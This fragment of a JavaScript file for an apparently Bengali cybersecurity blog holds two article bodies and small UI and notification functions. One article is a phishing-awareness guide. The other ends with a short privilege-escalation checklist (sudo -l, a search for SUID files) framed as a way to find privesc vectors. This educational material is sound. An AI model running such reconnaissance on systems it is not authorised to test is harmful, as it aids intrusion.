<li><code>scp file user@ip:/path</code> — secure file copy</li>
<li><code>tcpdump -i eth0 port 80</code> — packet capture</li>
</ul>
<h3>Privilege Escalation Check</h3>
<p><code>id</code> <code>sudo -l</code> <code>find / -perm -4000 2>/dev/null</code> (SUID files) — এই commands দিয়ে privesc vector খোঁজুন।</p>`
  },
  {
    cat:'Social Engineering', icon:'🎭', date:'01 Apr 2026', time:'7 min',
    title:'Phishing Attack চেনার উপায় ও প্রতিরোধ',
    body:`<h3>Phishing কী?</h3>
<p>Phishing হলো social engineering attack-এর সবচেয়ে সাধারণ ধরন। attacker ব্যাংক, Google বা Facebook-এর মতো বিশ্বস্ত সংস্থার ছদ্মবেশে email বা message পাঠিয়ে ব্যক্তিগত তথ্য চুরি করে।</p>
<h3>Phishing-এর ধরন</h3>
<ul>
<li><strong>Email Phishing</strong> — fake email দিয়ে malicious link পাঠানো</li>
<li><strong>Spear Phishing</strong> — নির্দিষ্ট ব্যক্তিকে target করে personalized attack</li>
<li><strong>Smishing</strong> — SMS-এর মাধ্যমে phishing</li>
<li><strong>Vishing</strong> — phone call-এর মাধ্যমে তথ্য নেওয়া</li>
<li><strong>Clone Phishing</strong> — real email-এর exact copy তৈরি করে link change করা</li>
</ul>
<h3>Phishing চেনার উপায়</h3>
<ul>
<li>🔍 Sender-এর email address মনোযোগ দিয়ে দেখুন (<code>support@g00gle.com</code> ≠ Google)</li>
<li>🔍 Link-এ hover করুন — real URL দেখুন click করার আগে</li>
<li>🔍 জরুরি ভাষা বা ভয় দেখানো ("আপনার account বন্ধ হবে!") সন্দেহজনক</li>
<li>🔍 Grammar ও spelling mistakes দেখুন</li>
<li>🔍 SSL certificate চেক করুন — <code>https://</code> থাকলেই safe না</li>
</ul>
<h3>প্রতিরোধের উপায়</h3>
<ul>
<li>✅ <strong>Multi-Factor Authentication (MFA)</strong> সব জায়গায় চালু রাখুন</li>
<li>✅ কোনো link-এ click করার আগে URL ভালোভাবে দেখুন</li>
<li>✅ Password Manager ব্যবহার করুন — ভুল site-এ fill করবে না</li>
<li>✅ Email filter ও anti-phishing tool ব্যবহার করুন</li>
<li>✅ কখনো email-এ পাসওয়ার্ড বা OTP শেয়ার করবেন না</li>
<li>✅ Suspicious link VirusTotal.com-এ check করুন</li>
</ul>
<h3>বাংলাদেশে সাধারণ Phishing</h3>
<p>bKash, Nagad, ব্যাংক এবং government portal-এর নামে phishing সবচেয়ে বেশি। অজানা number থেকে OTP চাইলে কখনো দেবেন না।</p>`
  }
];

function openBlog(idx){
  var b=BLOGS[idx];
  if(!b)return;
  document.getElementById('bmCat').textContent=b.cat;
  document.getElementById('bmTitle').textContent=b.title;
  document.getElementById('bmMeta').textContent=b.date+' · '+b.time+' read';
  document.getElementById('bmBody').innerHTML=b.body;
  document.getElementById('blogOverlay').style.display='flex';
  document.body.style.overflow='hidden';
}
function closeBlog(){
  document.getElementById('blogOverlay').style.display='none';
  document.body.style.overflow='';
}

// ====== TOAST ======
function showToast(type,ic,msg,duration){
  duration=duration||3500;
  var wrap=document.getElementById('toastWrap');if(!wrap)return;
  var t=document.createElement('div');t.className='toast '+type;
  t.innerHTML='<div class="toast-ic">'+ic+'</div><div class="toast-msg">'+msg+'</div><div class="toast-x" onclick="this.parentElement.remove()">✕</div>';
  wrap.appendChild(t);
  setTimeout(function(){if(t.parentElement)t.remove();},duration);
}

// ====== TELEGRAM ======
function sendTelegramNotify(msg){
  // Call server-side proxy — TG_BOT_TOKEN stays on the server
  fetch('/api/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:msg})}).catch(function(){});
}

function qm(txt){document.getElementById('chatIn').value=txt;sendChat();}
